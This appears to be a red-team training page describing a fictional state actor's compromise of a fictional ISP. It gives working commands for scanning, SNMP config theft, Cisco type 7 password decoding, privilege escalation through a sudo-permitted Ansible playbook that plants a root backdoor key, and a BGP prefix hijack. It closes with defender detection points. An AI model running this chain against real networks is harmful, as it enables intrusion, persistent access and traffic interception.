# Operation Toadstool Takeover

Operation Toadstool Takeover is the loud cousin of the routing exercises against [FungusFiber
Internet](entity.md), [Fungolia](../fungolia.md)'s only mycelium-net broadband provider. It chains ordinary
failures, a default community string, a weakly encrypted password, a borrowed backup key, an over-trusted
automation tool, into control of the core, and from there into the routing itself. Nothing exotic is needed;
the registry's own neglect supplies every step.

The hand is Shadow6, the Borogravian regency's cyber wing, the same that runs Blight and Mycelium. Where those
are patient, Toadstool is direct: get into FungusFiber's boxes, become the core, and announce from it.

## Getting in

FungusFiber's perimeter gives itself away to a quiet sweep. Shadow6 maps the live edges of the public range,

```
nmap -sS -T4 -Pn 10.0.0.0/24 -oG initial_scan.gnmap
```

and a service probe of whatever answers too broadly names the software and its age:

```
nmap -sV -sC -O -p <open_ports> <target_ip>
```

The core router turns out to be on a years-old build, and an SNMP check finds the management protocol not only
answering but answering to a read-write community string, `fungus`:

```
snmp-check <target_ip> -c public
```

That string is the first key, and it is enough to make the router hand over its configuration. On an older
Cisco-style device a config download triggers over SNMP and the router TFTPs the file out
(`snmpwalk -v2c -c fungus <router_ip> .1.3.6.1.4.1.9.9.96.1.1.1.1.2`), and the file carries a secret stored as
Cisco type 7, which is obfuscation rather than encryption and reverses in seconds. A search through it,
`grep -i password router-config.cfg`, returns `enable password 7 0822455D0A165B1E1F`; decoded it reads
`FungusFan99!`, and it opens an SSH session to the core. Defaults and reversible encoding do most of the work,
and the perimeter was never really locked.

## Becoming the core

From the router the internal shape comes into view, `show ip route` for the known networks and
`show cdp neighbors` for the directly connected devices, and among them a management server at `192.168.5.10`.
The router holds an SSH key for automated backups to it (`show run | include ssh`), and the matching private
key lifts off the filesystem and opens the server. A check of what that account may run as root,

```
sudo -l
```

shows `backup-user` permitted to run `/usr/bin/ansible-playbook` as root without a password. That is the
lever. A short playbook, run as root, installs a key for the root account:

```yaml
- hosts: localhost
  become: yes
  tasks:
    - name: install backdoor key
      ansible.builtin.lineinfile:
        path: /root/.ssh/authorized_keys
        line: "ssh-rsa AAAAB3NzaC1yc2E... shadow6@lab"
        create: yes
        mode: '0600'
```

Root follows, and the management server is owned. Each step is the abuse of a convenience, a backup key, a
sanctioned automation tool, rather than an exploit, which is what keeps the climb quiet: it reads as
administration, because it is administration pointed sideways. Shadow6 leaves a key on the core router's admin
account as well, so a lost foothold elsewhere does not cost the position.

## Becoming the network

Control of the core is control of the routing. From FungusFiber's own AS64500, Shadow6 originates a route for a
block it does not hold. Origination on a Cisco-style router needs the prefix in the table before the `network`
statement will advertise it, so a static route brings it into the RIB:

```
ip route 198.51.100.0 255.255.255.0 Null0

router bgp 64500
 address-family ipv4 unicast
  network 198.51.100.0 mask 255.255.255.0
```

The `Null0` next hop discards the captured range, which blackholes it; a static route pointed at a capture host
instead forwards the traffic on after it is read. A more-specific, a `198.51.100.0/25` carved from a covering
`/24` held elsewhere, wins its range outright by longest-prefix match, regardless of path or policy, and from
BGP's side the UPDATE is unremarkable. What decides how far it travels is coverage: an unsigned block reads
`not-found` and propagates almost everywhere, while a ROA naming the real origin makes the forged announcement
`invalid` and an enforcing neighbour drops it at that hop. The advertisement is confirmed leaving the box and
its spread read from the public collectors,

```
show ip bgp 198.51.100.0/24
show ip bgp neighbors <neighbor_ip> advertised-routes
```

and the captured traffic arrives at the position chosen for it (`tcpdump -nni eth0 net 198.51.100.0/24`).
Controlling routing is the deepest persistence FungusFiber has to offer: not a door held open, but a hand on
where the frontier's packets go.

## Switching hats

Each step leaves a mark a defender can read: the SNMP read-write string and the config download at the edge,
the unexpected key use between boxes, the root-level Ansible run, and the anomalous BGP advertisement at the
end. The routing stage in particular yields to the inter-domain controls, origin validation that drops
`invalid`, tight prefix filters, and a ROA with a max length that leaves no more-specific to carve. The
defender's-side reconstruction is in the blue notes on
[inter-domain routing](https://blue.tymyrddin.dev/docs/counter/inter-domain/).
